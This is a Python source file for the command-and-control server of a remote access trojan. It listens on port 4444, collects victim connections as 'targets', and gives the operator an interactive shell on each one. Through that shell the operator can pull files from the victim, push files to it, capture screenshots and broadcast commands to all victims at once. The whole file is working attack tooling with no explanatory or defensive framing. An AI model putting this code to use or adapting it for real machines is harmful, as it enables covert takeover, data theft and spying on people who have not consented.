#!/usr/bin/python

import socket
import threading
import json
import os
import base64
import requests
import sys
from mss import mss
import shutil

counter = 0

# send data
def broadcast(target, data):
    json_data = json.dumps(data)
    target.send(json_data)


def shell(target, ip):

    # send data
    def sending(data):
        json_data = json.dumps(data)
        target.send(json_data)

    # receiving data
    def receiving():
        data = ""
        while True:
            try:
                # controlling data processing
                data = data + target.recv(4096)
                # return data to the shell function
                return json.loads(data)
            except ValueError:
                # continue the loop if the data sent is bigger than 1024
                continue

    global counter
    while True:
        command = raw_input('[+] Shell#~%s: ' % str(ip))
        # send it to the target
        sending(command)
        if command == "q":
            break # this only breaks the loop - goes to the CC again
        elif command == "exit":
            target.close() # closing target
            targets.remove(target) # removing from list of targets
            ips.remove(ip) # removing from from list of ips
        elif command[:2] == "cd" and len(command) > 1:
            print("[!] Command executed")
            continue
        elif command[:8] == "download":
            try:
                # after download
                with open(command[9:], "wb") as file: # wb = wrte bytes
                    data = receiving() # downloading function
                    file.write(base64.b64decode(data)) # writing to file (decoded file data - for images)
                    print("[!] Download success")
            except Exception as e:
                sending(base64.b64encode("[!] Failed to Download"))
        elif command[:6] == "upload":
            try:
                with open(command[7:], "rb") as file:
                    # sending the content of the file
                    sending(base64.b64encode(file.read())) # encoding file to base64
                    print("[!] Upload executed")
            except Exception as e:
                sending(base64.b64encode("[!] Failed to upload"))
        elif command[:10] == "screenshot":
            # grab the file
            with open("screenshot%d" % counter, "wb") as ss:
                image = receiving()
                # decode image
                decoded = base64.b64decode(image)
                # checking if saved
                if decoded[:3] == "[!]":
                    print(decoded)
                else:
                    ss.write(decoded)
                    counter += 1
        else:
            result = receiving()
            print(result)


# accepting connections
def server():
    global connections
    while True:
        if stop:
            break
        s.settimeout(1)
        try:
            target, ip = s.accept()
            # appending to lists
            targets.append(target)
            ips.append(ip)
            print("[+]" + str(targets[connections]) + " - " + str(ips[connections]) + " connected")
            # increasing connections
            connections += 1
        except Exception as e:
            pass

if __name__ == "__main__":
    # ips and sockets lists
    ips = []
    targets = []

    # simple socket connection
    global s
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    # set options
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    # binding to machine
    s.bind(("192.168.1.111", 4444))
    # number of connections allowed
    s.listen(5)

    # connection counter
    connections = 0
    # stop connection loop
    stop = False

    print("[*] Waiting for targets")

    # creating thread
    t1 = threading.Thread(target=server)
    t1.start()

    # Command Center
    while True:
        command = raw_input("[*] CC: ")
        if command == "targets":
            # showing connected targets
            count = 0
            for ip in ips:
                print("Session: " + str(count) + " - " + str(ip))
                count += 1
        elif command[:7] == "session":
            try:
                # grabbing the session number
                num = int(command[8:])
                target = targets[num]
                ip = ips[num]
                # calling the shell
                shell(target, ip)
            except Exception as e:
                print("[!] No session found")
        elif command == "exit":
            # closing target connections
            for target in targets:
                target.close()
            # closing socket
            s.close()
            # flag control to True
            stop = True
            # join the main program
            t1.join()
            break
        elif command[:3] == "all":
            length = len(targets) # checking how many sockets are
            i = 0
            try:
                while i < length:
                    num = targets[i]
                    broadcast(num, command) # whole command sent
                    i += 1
            except Exception as e:
                print("[!] Failed to broadcast")
        else:
            print("[!] Command does not exist")
